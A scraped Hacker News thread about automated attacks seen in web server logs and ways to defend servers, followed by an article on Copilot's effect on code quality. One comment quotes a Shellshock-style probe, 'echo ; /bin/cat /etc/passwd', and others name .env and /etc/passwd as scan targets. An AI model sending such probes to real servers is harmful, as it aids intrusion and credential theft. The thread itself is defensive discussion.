combinations. The attacker even went to the trouble of spoofing some custom headers in our API client. Our eventual solution was to a) attack our own auth credentials first, identify any users with leaked creds (from other services) and force a password reset for them. b) disallow users from setting common leaked passwords. c) make the auth checking request as low-cost as possible, and scalable separately from the main application. d) when an attack request is detected, bypass the relatively-expensive real cred check but return the same failure response (including timing) as a real failure. e) build a secondary requirement in the auth flow that can be transparently enabled when under high volume attack. This works, so far. It sheds the volume to the application, and has low-to-zero impact on legit users. This took a couple weeks away from feature development though! reply cantSpellSober 18 hours agoprev> the user agents for these attacks mention Mozlila/5.0 The linked write up on why is interesting, finds attacks for many of the same files, and recommends blocking the user agent. reply aborsy 13 hours agoprevI’m looking for a secure authentication/proxy application to put in front of the webservers that have to be exposed to the internet. The application will authenticate the user with SSO or hardware key, before forwarding the traffic to the right internal address. Cloudflare Tunnels are great, but CF doesn’t allow the TLS pass through. CF man in the middles and decrypts the traffic. So far I have looked into Teleport, authelia, authentik, and keycloak, perhaps combined with Traefik. Any feedback on the level of security of these tools for being exposed to the public internet? reply FuriouslyAdrift 13 hours agoparentGranted we are a Microsoft-based shop, but Microsoft Entra Application Proxy has worked out great for exposing our internal web based apps to the outside for mobile/home workers. https://learn.microsoft.com/en-us/entra/identity/app-proxy/a... reply aborsy 13 hours agorootparentThis seems to be very similar to the Cloudflare tunnels. They are reverse proxies in the cloud, with TLS termination. The traffic is terminated and scanned in the cloud. https://learn.microsoft.com/en-us/entra/identity/app-proxy/a... A version with end to end encryption will be great! reply lukax 13 hours agoparentprevIf your auth provider supports is OAuth 2 OIDC you should check oauth2-proxy. It's just one binary or a container sidecar. https://github.com/oauth2-proxy/oauth2-proxy reply iboisvert 16 hours agoprevAs someone who knows very little about security, this is really interesting, thanks! A question though: how would one know if there has been a breach? These examples look relatively easy to detect, but I guess there would be more complex cases? reply macintux 16 hours agoparentI also know very little, but something that struck me upon reading your question: if a breach is successful, the logs can't be relied upon for detection/analysis if they're on the same server. It's important to ship them elsewhere. reply takemine 5 hours agoparentprevYou can use honeypot that bait hackers . I am running a non-intrusive one where you put baits in your servers or laptop, when hackers see it, they'll try to use them. reply kevindamm 16 hours agoparentprevThis is why some people run a honeypot in their network... and even those won't necessarily catch everything if the honeypot only mimics services that the attacker isn't probing for. You can set up tripwires on access and egress of sensitive data but that's only part of the surface area (and if the system gets attacked those tripwires could be disabled, if the attacker either knows what to look for or has a plan for a side channel for exfiltrating data). Really the only good answer is defense in depth and keep looking for any indicators of odd behavior, and wall out unrelated systems entirely from each other, keep the DMZ and public facing bits as simple as possible. reply tamimio 11 hours agoparentprevIOC or indicators of compromise, but if you know little it is always advisable to hire someone to go through it on demand or periodically as there’s no one trick to rule them all. reply daneel_w 11 hours agoprevCurious enumerations on the most common items. There's definitely a topical bias. By far the most common attack attempt I see on all the various webhosts I administer is WordPress-oriented (despite not present on any of the hosts), which doesn't even get an honorable mention by the author. Perhaps he hosts WordPress content and didn't discern attacks from legitimate traffic. reply Adachi91 5 hours agoprevI always find it fun to respond in strange ways to \"malicious\" requests on all my webservers derived from a defcon talk[0] that I watched a while ago, there's a lot of great fun to be had in honeypots and other things of the nature. [0] https://www.youtube.com/watch?v=4OztMJ4EL1s reply SamuelAdams 18 hours agoprevWhat are some realistic, self hosted mitigation strategies for defending against these attacks? reply ufmace 14 hours agoparentIMO, you shouldn't do anything special. They're all very low-skill automated attacks. Just design and deploy stuff well, do the basic stuff correctly before you make anything publicly accessible, and don't worry about the noise. If you're doing things properly, none of it will work. Whatever fancy thing anyone suggests to try to reduce the noise likely won't slow down any actual determined human attacker much, and will just cause you more hassle to deploy and maintain. reply wetbaby 16 hours agoparentprevNord Meshnet, ZeroTier, Cloudflare Tunnels. Instead of exposing your applications externally, you create a private network that uses UDP hole punching. This isn't completely self-hosted, as you need some server to auth / broadcast connection details with. Self-hosting might be possible on ZeroTier, but I'm not familiar enough to say for sure. reply tamimio 11 hours agorootparentYeah you can self host zerotier, there’s even quick docker for it. reply mfashby 18 hours agoparentprevUpdates as the other commenter says. Also isolation technology like docker containers, chroots, bsd jails, protections that systemd offers, or virtual machines. While not perfect, it means that the attackers must have the ability to chain exploits in order to break out of the compromised application to the rest of the host system. reply ggpsv 17 hours agorootparentDocker is great but it is easy to shoot yourself on the foot if you use it conveniently but don't actually understand it. A common mistake is to publish the Docker ports unknowingly to all interfaces (e.g `5432:5432`), which makes your Docker container available to everyone. It is common to see this in Docker tutorials or pre-made Docker Compose files. Coupled with UFW, it may give you a false sense of security because Docker manages its own iptables rules. reply elashri 17 hours agorootparentI do make the habit of not expose ports and just use reverse proxy for the container. Of course, you will need a bridged network between the reverse proxy container and the target container, but that's fine. I'm sure there is more clever ways around that. reply ggpsv 17 hours agorootparentI prefer to run the webserver using systemd on the host so publishing the container port to 127.0.0.1 is enough for me. reply mfashby 12 hours agorootparentprevYes I've made this mistake with docker and UFW before :( Such a footgun. reply ggpsv 17 hours agoparentprevDon't expose your services publicly unless it is necessary. If you're self-hosting services that are meant to be accessed only by you then consider accessing them exclusively over a VPN like Wireguard (Tailscale is nice) and firewall everything else. reply yjftsjthsd-h 17 hours agorootparentOr, depending on practical constraints, even http simple auth via nginx/apache reverse proxy. reply ggpsv 17 hours agorootparentYes, though I'd say _and_ not _or_. Just because you're using a VPN it doesn't mean you should drop all forms of authentication. reply yjftsjthsd-h 17 hours agorootparentWell, I did mean or; sometimes just sticking httpd in front of the application with a user:pass over https is fine, and also much easier if the client can't run a VPN client or doesn't want to. reply Aachen 16 hours agorootparentprevI am not aware of a vulnerability in popular web server software that affected a basic auth login screen for over a decade. Assuming you use a proper password and don't typo the domain and end up on someone who wants to specifically phish you through typo squatting, it's about as solid as SSH or Wireguard They serve different use-cases but I wouldn't say that VPN is strictly better than HTTP auth or vice versa. Recommending to double up for a self-hosted little something, not a big target like 4chan or Gmail, is overkill reply ggpsv 16 hours agorootparentWhat I'm saying is that security is about layers. I agree with you, a VPN and HTTP auth is not apples to apples where one is better than the other. reply layer8 11 hours agoparentprevUse packages from a distribution like Debian and run unattended-upgrades or equivalent for the security-updates repository. They usually fix newly reported vulnerabilities in less than a day. reply achairapart 17 hours agoparentprevAlso, be sure your web server is not serving dotfiles/dotfolders (apart for a few legitimate reasons, ie .well-known). reply Aachen 16 hours agorootparentWhy? Code is open source and I don't check config changes into .git. Do you mean like .htpasswd which is already default disallowed (on web servers that make use of it in the first place; I think Nginx doesn't block it by default but also doesn't use it so it wouldn't grant any access)? reply azeemba 18 hours agoparentprevUpdate your software frequently. reply klysm 18 hours agorootparentBut not too frequently reply Tijdreiziger 12 hours agorootparentI’d rather update it too frequently and potentially bork something, than not update it frequently enough and potentially get pwned. reply lazyeye 16 hours agoparentprevTailscale is ridiculously easy to install and get running. reply pid1wow 11 hours agoprev> directory traversal The correct term is directory enumeration. Traversal usually means something about ../../ reply yawaramin 13 hours agoprevDoes anyone else have the experience that almost every single one of the 'attacks' is using HTTP and not following a 301 redirect to HTTPS? I have my internet-facing web server set up to redirect all HTTP -> HTTPS and this thwarts almost every 'attack'. I have to say, they're not very smart about it. reply gary_0 11 hours agoparentI do that as well, but nothing gets through anyways because I'm not running Wordpress or a version of Apache from 2012. I also have nginx set up to reject connections without the expected 'Host' header, and that quickly bounces a few attackers. But many still end up getting all the way to a 404 or 400 for their attack URL. reply qaq 14 hours agoprevTangentially the sad thing about whole cyber sec space is that well resourced APTs like say APT-29 Cozy Bear. Have enough resources and actually run labs where they deploy all top Endpoint solutions and validate their offensive tools against them. reply Erratic6576 16 hours agoprevI once got a message in my logs “you have been powned” :/ reply ijhuygft776 13 hours agoparentwhat did you do about it reply Erratic6576 12 hours agorootparentI don’t remember well. I guess I Worried and stopped reading logs. Aah. I diverted my domain to cloudflare, allowing only traffic from 1 country in. So instead of exposing my IP publicity through my registrar, I set the firewall to only allow traffic in from cloudflare. I would have loved to install PfSense as well but it was out of my budget reply ijhuygft776 11 hours agorootparentso, you, are, still, hacked. reply nothis 17 hours agoprevHyper-naive take: Couldn't nearly all of these attacks be blocked by a white-list approach, essentially hiding every file or directory from the internet except a very controlled list of paths and escaping all text sent so it can't contain code? I somehow always imagine these types of hacks to be more clever, like, I dunno, sending harmless-looking stuff that causes the program receiving it to crash and send some instructions into unprotected parts of RAM or whatever. This all looks like \"echo ; /bin/cat /etc/passwd\" and somehow the server just spitting it out. Is that really the state of web security? reply quesera 17 hours agoparent> Couldn't nearly all of these attacks be blocked by a white-list approach, essentially hiding every file or directory from the internet except a very controlled list of paths and escaping all text sent so it can't contain code? This is basically how things work. For convenience, instead of itemizing each filename, the webserver root is a subdirectory and anything underneath is fair game. The webserver uses the OS \"chroot\" facility to enforce this restriction. What you are seeing is ancient exploitation strings from 30 years ago that haven't worked on any serious webserver since that time, but a) keeping the test in the attackers lib is essentially free, and b) there are some unserious webservers, typically in cheap consumer hardware. Webservers pass plain text to the app server. It is the app server/framework's responsibility to understand the source of the request body and present it to the application in a clear way, possibly escaped. But the app needs to process this and sometimes through poor coding practices, fails to respect the untrusted nature of the data. This again is more typical in historical systems and low-cost consumer products where software is not a marketing advantage. reply InitialBP 5 hours agorootparent> ancient exploitation strings from 30 years ago that haven't worked on any serious webserver since that time Unfortunately, there are plenty of serious (business critical) servers that _ARE_ vulnerable to these types of attacks. I've found and remediated things like this all the time. One very common example I've seen of the `.env` issue is Django servers that are exposed to the internet in with debug=True. There's probably thousands if not tens of thousands of servers leaking credentials this way on the internet now. Beyond that, companies often have internal systems that do not meet the same security standards that external systems require, and sometimes those systems get shifted around, maybe it's moved to a new subnet, maybe a third-party needs access and the CIDR range gets fat fingered in the firewall. Regardless - now that \"internal system\" is exposed to the internet with all the dangerous configuration. reply InitialBP 5 hours agoparentprevBit of a rambly reply: There are different types of web security vulnerabilities and the attacks you see from automated scanners are likely to be far less sophisticated than targeted web attacks. Specifically these scanners are going to spam out widespread and common CVE's that might grant privileged access to the server or dump credentials in some fashion. The more sophisticated attack you described is essentially an overflow, and most modern web servers are usually written in memory-safe languages making it very unlikely to see that type of attack on the web. More often it's the underlying OS, servers, or communication stacks (bluetooth, TCP, nginx, etc) that have these types of vulnerabilities since they are often written in low level non memory safe languages like C and C++. Attacks that exploit the HTTP and HTTPS protocol are a little more interesting. Request smuggling lets you trick certain load balancers and webservers by sending an HTTP request \"smuggled\" inside of another HTTP request. Here is a blog by James Kettle's about some request smuggling vulnerabilities and the impact they can have. https://portswigger.net/research/http2 There's really a lifetime's worth of knowledge on web security and the type of stuff you see in scans is just trying to hit the low hanging fruit. Portswigger has loads of free challenges and information about different web security topics. https://portswigger.net/web-security/all-topics reply Thorrez 17 hours agoparentprev>This all looks like \"echo ; /bin/cat /etc/passwd\" and somehow the server just spitting it out. Is that really the state of web security? It's attempting to exploit a vulnerability in bash that was discovered and fixed in 2014: https://en.wikipedia.org/wiki/Shellshock_(software_bug) reply dartos 17 hours agoparentprevYou’re probably right, but consider that not every person is even aware of the security risks of running servers. Someone might be trying to play with self hosting or a contractor at a company did a bad job and accidentally exposed stuff they shouldn’t. This attacker is likely just trolling lots of IPs hoping for low hanging fruit that can be exploited with simple/well known attacks. reply scherlock 17 hours agoparentprevYup, 99.999% are script kiddies running bots that look for unsecured servers or indicators for known exploits. reply Zetobal 17 hours agoparentprevSecurity through obscurity is like a ninja tiptoeing in a room full of laser beams; make one loud move and you'll reveal that your entire protocol hinges on no one sneezing! reply akerl_ 17 hours agorootparentHow is strictly controlling exposed server resources to only URIs you’ve confirmed should be an exposed an example of “security through obscurity”. reply emmanueloga_ 15 hours agoprevWAF seems to be an essential piece for any website with even a little bit of visibility / traffic on the net. Some questions: * Comparison of AWS WAF vs Cloudflare vs Others? * Many services like EC2 charge for data transfer [1], so how much of your monthly/yearly costs of hosting goes toward fending scans like these? Does AWS count any traffic blocked by the WAF toward the transfer limits? -- 1: https://aws.amazon.com/ec2/pricing/on-demand/ reply nickjj 12 hours agoparentIf you're on AWS the AWS WAF is pretty low cost. You can expect to pay less than $10 / month and still get an ok amount of value on a decently popular site. The problem is you have to manually configure a lot, the rate limiting aspect is way worse than Cloudflare and while the AWS WAF can geolocate an IP address and block by country it does not send the country code back to you in a header where as Cloudflare does. The last one stings because it's super handy to have an accurate country code attached to each request, especially if it's something you don't need to think about or waste I/O time calling out to a 3rd party service in the background to backfill in that data later. reply emmanueloga_ 10 hours agorootparentThis is helpful! I found some CDK libraries that allows for connecting a load balancer or Cloudfront to WAF with a few lines of code. I'll give it a try! [1] [2]. -- 1: https://github.com/awslabs/aws-solutions-constructs/tree/mai... 2: https://constructs.dev/search?q=waf&cdk=aws-cdk&cdkver=2&lan... reply nickjj 9 hours agorootparentYep, that's one of the values of the WAF, it can be associated with your ALB which means you can match rules on headers, cookies, etc. after the traffic has been decrypted. reply rfmoz 15 hours agoparentprevWith Fastly WAF - SignalSciences, Distil Networks - Imperva, Akamai - StackPath. There are a few companies that started alone in this ecosystem and found the evolution path with the mayor CDN networks, those who have failed themselves in provide a good internal alternative service. Human security - PerimeterX, Haproxy WAF, Datadome, are other players to different target audience. If you have a good control over the app exposed, maybe you only need a WAF in the sense of stop stuff outside your infra. The sql injections, weird urls trying the way to /etc/passwd or related things look from the past and only makes noise nowadays. The real issue is when someone hits you in a rate impossible to manage with your resources or when it cost you more than the securing layer. reply tamimio 11 hours agoprevYeah some thing in websites I have, even the personal one, they get on average tens of these attacks, and again, it seems they are after .env too and other php related directories. Big portion of these attacks come from TOR networks too. reply zetalemur 12 hours agoprevInteresting. Came to similar conclusions when analyzing my (httpd) access logs for https://turmfalke.httpd.app/demo.html ... but so far nothing really out of the ordinary. reply sph 16 hours agoprevSSH is constantly hammered by bots as well: % ssh example.com Last failed login: Sun Jan 28 16:59:35 UTC 2024 from 180.101.88.233 on ssh:notty There were 5385 failed login attempts since the last successful login. Last login: Sat Jan 27 13:33:30 2024 from xxx.xxx.xxx.xxx 5.3k failed attempts in ~30 hours. I know, I should be setting up fail2ban. reply SoftTalker 16 hours agoparentfail2ban will reduce your log noise but it's another thing to manage, you can end up locking yourself out also, and if you're using good passwords (or better, public key auth) it's not really providing any additional safety. Ideally you don't need ssh open to the whole world anyway, and can restrict it to a certain subnet or set of addresses. Then your attacks will drop to nearly zero. reply idoubtit 16 hours agoparentprevfail2ban is not very performant and it will only reduce the amount of attempts. An alternative is to add a nftables rule (or iptables or whatever firewall). Something like : table inet filter { chain input { tcp dport ssh accept comment \"Accept SSH\" tcp dport 22 ct state new limit rate over 2/minute drop But even with rate limiting, the logs are still polluted by auth attempts. Changing the port does little. The only solution we found was to configure port knocking (with direct access from a few whitelisted IPs). reply miyuru 16 hours agoparentprevMost of my servers are IPv6 only and there are no failed ssh attempts on those. I install fail2ban just in case and firewall the IPv4 address, since I don't SSH via IPv4. reply nerdponx 16 hours agoparentprevI set my SSH port to something with a high number that is not used by any other known service. Drive-by attacks dropped to 0. reply emmanueloga_ 15 hours agoparentprevIn case you are using AWS, I learned that you can close port 22 on your EC2 instances, and connect trough the Systems Manager (SSM): https://cloudonaut.io/connect-to-your-ec2-instance-using-ssh... reply NavinF 16 hours agoparentprev> I should be setting up fail2ban. No, that does nothing if you followed best practices and disabled password login. fail2ban is just another Denial of Service risk that has the added bonus of bloating your firewall table and slowing down all your new connections reply vldb7 16 hours agoparentprevI’m not a fan of fail2ban. A simple but quite effective approach would be permitting remote login only from certain IP ranges. I know that it looks like a bad trade for self hosted web apps, but it is very easy to setup on many cloud providers. Also I normally set up a jump host first - a smallest instance that only runs ssh and everything else would not open ssh port to the outside at all. One nice effect is having to search just one auth log if something about ssh looks concerning. reply m0rissette 15 hours agoprevMan people don’t use shadow anymore and expose creds through /etc/passwd; craziness reply rsolva 16 hours agoprevIf someone has experience with CrowdSec (a kind of crowdsourced fail2ban), I would like to hear your opinion! reply creeble 15 hours agoparentDon’t know CrowdSec but have used abuseipdb.com a bit to reduce log noise. reply takemine 9 hours agoprevNice analysis! You should protect your infra to avoid this kind of scanning: - Disable password login for SSH, use keys instead. - Limit access to known IPs (with a managed vpn) - Use Cloudflare: Their WAF is really good - Forward logs to an other service that can analysis logs (datadog is nice) shameless plug: started a small honeypot service[1] if anyone would need it as a last resort[1] to catch hackers in your servers . Feedbacks appreciated! [1] https://hackersbait.com reply urbandw311er 14 hours agoprevAs a thought experiment - if there was public money to back this, would it be making us all safer to run a series of honeypot servers that automatically start DDOSing the various C&C servers that attempt to compromise them? reply PeterisP 12 hours agoparentSuch a response would generally be a crime; existing cybercrime legislation generally does not have any clauses permitting retaliation as \"self defence\", and also very often you'd be DDoSing an innocent third party, another victim whose compromised device is abused to route traffic, and also affecting their neighbors on the same network. reply foofie 18 hours agoprevI also check the access logs collected by my self-hosted services, and I think there's a detail that's conspicuously absent from this analysis: the bulk of these malicious requests are made by regular people running plain old security scanners that are readily available from sites such as GitHub. These are largely unsofisticated attacks that consist of instances of one of these projects just hammering a server without paying any attention to responses or even if they have been throttled or not. Some attacks don't even target the IP and instead monitor domains and its subdomains, and periodically run the same scans from the exact same range of IP addresses. For example, on a previous job we had a recurring scan made over and over again from a single static IP address located in Turkey that our team started to refer to it as \"the Turkish guy\", and our incident response started featuring a preliminary step to identify weird request patterns that was basically checking if it was the Turkish guy toying with our services. reply burgerquizz 17 hours agoprevI am wondering if there was any reports (on large scale systems) on what hackers were looking for on servers? reply CharlesW 17 hours agoparentCloudflare's WAF managed rulesets changelog might be helpful for this: https://developers.cloudflare.com/waf/change-log For example, they did an emergency update on 1/22 in response to CVE-2023-22527. reply azinman2 18 hours agoprevWhy protect the IPs of the those trying to attack you? reply bshacklett 18 hours agoparentMost of them are probably bots running without the knowledge of the IP owner. There’s little benefit to sharing those IPs with anyone other than the provider who owns them. reply elendee 9 hours agoprevautoGPT thanks you for this lucid writeup reply oars 9 hours agoprevGreat post, thanks for sharing. reply SebFender 14 hours agoprevInteresting, well prepared and presented - a necessary read for many. reply dangus 16 hours agoprevI would be interested in reading something similar but focused on less common ports and services, like game servers that run on high ports and more typically use UDP. I wonder if that’s more or less of a “safe” situation. reply jbverschoor 14 hours agoparentYou could and should alway monitor protocol errors (any protocol). reply nocommandline 17 hours agoprev [7 more] [flagged] Aachen 16 hours agoparentWhy not already publish the current state while testing? If the readme says it's currently in testing then it's still more inviting to look into than an empty repo reply nocommandline 16 hours agorootparentSorry, I'm not quite clear what you mean. Do you mind explaining again? reply hk__2 14 hours agorootparentNot OP but: why don’t you put the code in GitHub, even if it’s not ready? reply quesera 17 hours agoparentprev [–] FYI this repo is empty except for a README. reply nocommandline 17 hours agorootparent [–] Yes. At the bottom - it says coming soon. I should probably move it to the top. reply Macha 17 hours agorootparent [–] Why share it if there's nothing to share? It's just pointless marketing. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "The conversation covers various cybersecurity measures to protect servers and prevent attacks, such as monitoring Certificate Transparency logs and securing SSH ports.",
      "It emphasizes the importance of staying updated on vulnerabilities, following best practices, and implementing multi-layered security.",
      "The effectiveness of IP blocking, the pros and cons of using Cloudflare, and the risks of running vulnerable servers are also discussed. Overall, the discussion highlights the need for proactive and comprehensive security measures."
    ],
    "points": 436,
    "commentCount": 242,
    "retryCount": 0,
    "time": 1706449836
  },
  {
    "id": 39168105,
    "title": "AI-powered GitHub Copilot linked to decline in code quality, raises concerns over long-term impact",
    "originLink": "https://visualstudiomagazine.com/articles/2024/01/25/copilot-research.aspx",
    "originBody": "Home News Tips & How-To Newsletters White Papers Webcasts Advertise About Us Training More .NET Tips and Tricks The Data Science Lab Practical .NET The Practical Client Data Driver C# Corner In-Depth PDF Back Issues HTML Issue Archive Archive Code Samples .NET Agile/Scrum ALM Open Source SharePoint Cross-Platform C# Mobile Corner Live! Video Azure Visual Studio Visual Studio Code Blazor/ASP.NET .NET C#/VB/TypeScript Xamarin/Mobile AI/Machine Learning News New GitHub Copilot Research Finds 'Downward Pressure on Code Quality' By David Ramel 01/25/2024 New research on the effect of AI-powered GitHub Copilot on software development cites some adverse results. The \"Coding on Copilot\" whitepaper from GitClear sought to investigate the quality and maintainability of AI-assisted code compared to what would have been written by a human. In other words: \"Is it more similar to the careful, refined contributions of a Senior Developer, or more akin to the disjointed work of a short-term contractor?\" The answer to that is summarized in this paragraph from the whitepaper's abstract: \"We find disconcerting trends for maintainability. Code churn -- the percentage of lines that are reverted or updated less than two weeks after being authored -- is projected to double in 2024 compared to its 2021, pre-AI baseline. We further find that the percentage of 'added code' and 'copy/pasted code' is increasing in proportion to 'updated,' 'deleted,' and 'moved 'code. In this regard, AI-generated code resembles an itinerant contributor, prone to violate the DRY-ness [don't repeat yourself] of the repos visited.\" That serves as a counterpoint to findings of some other studies, including one from GitHub in 2022 that found, for one thing: \"developers who used GitHub Copilot completed the task significantly faster -- 55 percent faster than the developers who didn't use GitHub Copilot.\" That study was noted in the new whitepaper from GitClear, which sells a cloud-based code review tool. In addition to productivity, the GitHub study also measured positive effects in developer satisfaction and conserving mental energy. GitClear's research, however, investigated \"how the composition of code changes when AI is used.\" GitClear said its report sheds light on: What are the three significant changes since Copilot's introduction? What do Technical Leaders need to be on the lookout for 2024? How can you measure the impact of AI on your team's code quality? Regarding that first item, the paper indicated the three most significant changes associated with Copilot's rise concerned \"Churn\" and \"Moved\" and \"Copy/Pasted\" code: Burgeoning Churn: \"The bottom line is that 'using Copilot' is strongly correlated with 'mistake code' being pushed to the repo.\" [Click on image for larger view.] Code Churn by Year (source: GitClear). Less Moved Code Implies Less Refactoring, Less Reuse: \"Combined with the growth in code labeled 'Copy/Pasted,' there is little room to doubt that the current implementation of AI Assistants discourages code reuse. Instead of refactoring and working to DRY ('Don't Repeat Yourself') code, these Assistants offer a one-keystroke temptation to repeat existing code.\" More Copy/Pasted Code Implies Future Headaches: \"There is perhaps no greater scourge to long-term code maintainability than copy/pasted code. In effect, when a non-keyword line of code is repeated, the code author is admitting 'I didn't have the time to evaluate the previous implementation.' By re-adding code instead of reusing it, the chore is left to future maintainers to figure out how to consolidate parallel code paths that implement repeatedly-needed functionality.\" The paper concludes: \"How will Copilot transform what it means to be a developer? There's no question that, as AI has surged in popularity, we have entered an era where code lines are being added faster than ever before. The better question for 2024: who's on the hook to clean up the mess afterward?\" Some other studies on the topic include: \"Exploring the Verifiability of Code Generated by GitHub Copilot: \"We found evidence which corroborates the current consensus in the literature: Copilot is a powerful tool; however, it should not be 'flying the plane' by itself.\" \"Assessing the Quality of GitHub Copilot's Code Generation: \"Our empirical analysis shows that GitHub Copilot is a promising tool based on the results we obtained, however further and more comprehensive assessment is needed in the future.\" Sea Change in Software Development: Economic and Productivity Analysis of the AI-Powered Developer Lifecycle: \"As more developers embrace these tools and acquire proficiency in the art of prompting with generative AI, it becomes evident that this novel approach to software development has forged a unique inextricable link between humans and artificial intelligence. This symbiotic relationship has the potential to shape the construction of the world's software for future generations.\" The Impact of AI on Developer Productivity: Evidence from GitHub Copilot: \"Observed heterogenous effects show promise for AI pair programmers to help people transition into software development careers.\" Study of software developers' experience using the Github Copilot Tool in the software development process: \"The results of the research indicate that developers' opinions are divided. Most of them met Github Copilot before attending the survey. The attitude to the tool was mostly positive but not many participants were willing to use it. Concerns are caused by security issues associated with using of Github Copilot.\" For its study, GitClear collected and analyzed 153 million changed lines of code, authored between January 2020 and December 2023. About the Author David Ramel is an editor and writer for Converge360. Printable Format comments powered by Disqus Featured New GitHub Copilot Research Finds 'Downward Pressure on Code Quality' \"We find disconcerting trends for maintainability.\" Microsoft Asks Devs About Visual Studio Pet Peeves: 'Don't Get Me Started' While the complaints are numerous and vociferous, Microsoft's Mads Kristensen took pains to reply to many, sometimes educating users on how to immediately solve their issues, sometimes pointing out where they can vote on relevant feature requests to solve the peeves, sometimes commiserating. Use Azure Quantum 'Playground' to Explore New v1.0 Dev Kit Despite reaching v1.0, it's described as an early preview with much more work to be done, more than six years after its debut. Microsoft: Study Proves Investing in 'DevEx' Pays Off Microsoft says organizational focus on improving the overall developer experience -- as opposed to traditional developer productivity/velocity measurements -- pays off, according to new research. 'All-in-One Search' Leads New Visual Studio Productivity Features Microsoft's' string of productivity improvements in Visual Studio 2022 over the past year have continued in v17.9 Preview 3, shipped last week. Most Popular Most Popular Articles Most Emailed Articles New GitHub Copilot Research Finds 'Downward Pressure on Code Quality' Microsoft Asks Devs About Visual Studio Pet Peeves: 'Don't Get Me Started' Rethinking Team Metrics Microsoft: Study Proves Investing in 'DevEx' Pays Off 'All-in-One Search' Leads New Visual Studio Productivity Features Subscribe on YouTube .NET Insight Sign up for our newsletter. Email Address*Country* United States of America Afghanistan Åland Islands Albania Algeria American Samoa Andorra Angola Anguilla Antarctica Antigua and Barbuda Argentina Armenia Aruba Australia Azerbaijan Austria Bahamas Bahrain Bangladesh Barbados Belarus Belgium Belize Benin Bermuda Bhutan Bolivia, Plurinational State of Bonaire, Sint Eustatius and Saba Bosnia and Herzegovina Botswana Bouvet Island Brazil British Indian Ocean Territory Brunei Darussalam Bulgaria Burkina Faso Burundi Cambodia Cameroon Canada Cape Verde (Cabo Verde) Cayman Islands Curaçao Central African Republic Chad Chile China Christmas Island Cocos (Keeling) Islands Colombia Comoros Congo Congo, the Democratic Republic of the Cook Islands Costa Rica Côte d'Ivoire Croatia Cuba Cyprus Czech Republic Denmark Djibouti Dominica Dominican Republic Ecuador Egypt El Salvador Equatorial Guinea Eritrea Estonia Ethiopia Falkland Islands (Malvinas) Faroe Islands Fiji Finland France French Guiana French Polynesia French Southern Territories Gabon Gambia Georgia Germany Ghana Gibraltar Greece Greenland Grenada Guadeloupe Guam Guatemala Guernsey Guinea Guinea-Bissau Guyana Haiti Heard Island and McDonald Islands Holy See (Vatican City State) Honduras Hong Kong Hungary Iceland India Indonesia Iran, Islamic Republic of Iraq Ireland Isle of Man Israel Italy Jamaica Japan Jersey Jordan Kazakhstan Kenya Kiribati Korea, Democratic People's Republic of Korea, Republic of Kuwait Kyrgyzstan Lao People's Democratic Republic Latvia Lebanon Lesotho Liberia Libya Liechtenstein Lithuania Luxembourg Macao Macedonia, the former Yugoslav Republic of Madagascar Malawi Malaysia Maldives Mali Malta Marshall Islands Martinique Mauritania Mauritius Mayotte Mexico Micronesia, Federated States of Moldova, Republic of Monaco Mongolia Montenegro Montserrat Morocco Mozambique Myanmar Namibia Nauru Nepal Netherlands New Caledonia New Zealand Nicaragua Niger Nigeria Niue Norfolk Island Northern Mariana Islands Norway Pakistan Oman Palau Palestinian Territory, Occupied Panama Paraguay Papua New Guinea Peru Philippines Pitcairn Poland Portugal Puerto Rico Qatar Réunion Romania Russian Federation Rwanda Saint Barthélemy Saint Helena, Ascension and Tristan da Cunha Saint Kitts and Nevis Saint Lucia Saint Martin (French part) Saint Pierre and Miquelon Saint Vincent and the Grenadines Samoa San Marino Sao Tome and Principe Saudi Arabia Senegal Serbia Seychelles Sierra Leone Singapore Sint Maarten (Dutch part) Slovakia Slovenia Solomon Islands Somalia South Africa South Georgia and the South Sandwich Islands South Sudan Spain Sri Lanka Sudan Suriname Svalbard and Jan Mayen Eswatini (Swaziland) Sweden Switzerland Syrian Arab Republic Taiwan, Province of China Tajikistan Tanzania, United Republic of Thailand Timor-Leste Togo Tokelau Tonga Trinidad and Tobago Tunisia Turkey Turkmenistan Turks and Caicos Islands Tuvalu Uganda Ukraine United Arab Emirates United Kingdom United States Minor Outlying Islands Uruguay Uzbekistan Vanuatu Viet Nam Venezuela, Bolivarian Republic of Virgin Islands, British Virgin Islands, U.S. Wallis and Futuna Western Sahara Yemen Zambia Zimbabwe I agree to this site's Privacy Policy Please type the letters/numbers you see above. Most Popular Articles Most Emailed Articles New GitHub Copilot Research Finds 'Downward Pressure on Code Quality' Microsoft Asks Devs About Visual Studio Pet Peeves: 'Don't Get Me Started' Rethinking Team Metrics Microsoft: Study Proves Investing in 'DevEx' Pays Off 'All-in-One Search' Leads New Visual Studio Productivity Features Upcoming Training Events 0 AM VSLive! 2-Day Hands-On Training Seminar: Azure OpenAI Workshop: A Comprehensive Hands-On Experience January 25-26, 2024 Visual Studio Live! Las Vegas March 3-8, 2024 VSLive! 2-Day Hands-On Training Seminar: From Zero to .NET MAUI March 19-20, 2024 VSLive! 4-Day Hands-On Training Seminar: Full Stack Hands-On Development with .NET (Core) July 16-19, 2024 Live! 360 2-Day Hands-On Seminar: Generative AI for the Enterprise - A Hands-on Experience April 9-10, 2024 Visual Studio Live! Chicago April 29-May 3, 2024 Visual Studio Live! Microsoft HQ August 5-9, 2024 VSLive! 4-Day Hands-On Training Seminar: Full Stack Hands-On Development with .NET (Core) December 10-13, 2024 Free Webcasts Myths and Realities in Telemetry Data Handling Transitioning from Xamarin.Forms to .NET MAUI: Key Takeaways How .NET MAUI Changes the Cross-Platform Game Summit MoneyTree Achieves Compliance and Speeds Innovation with AWS and Sumo Logic > More Webcasts Contact Us Advertise Training Print Issues Online Free Newsletters Site Map Reprints List Rental Application Development Trends AWSInsider.net ESJ.com FutureTech360 Live! 360 MCPmag.com MedCloudInsider Prophyts Pure AI Redmond Redmond Channel Partner TechMentor Events Virtualization & Cloud Review Visual Studio Magazine Visual Studio Live! ©1996-2024 1105 Media Inc. See our Privacy Policy, Cookie Policy and Terms of Use. CA: Do Not Sell My Personal Info Problems? Questions? Feedback? E-mail us.",
    "commentLink": "https://news.ycombinator.com/item?id=39168105",
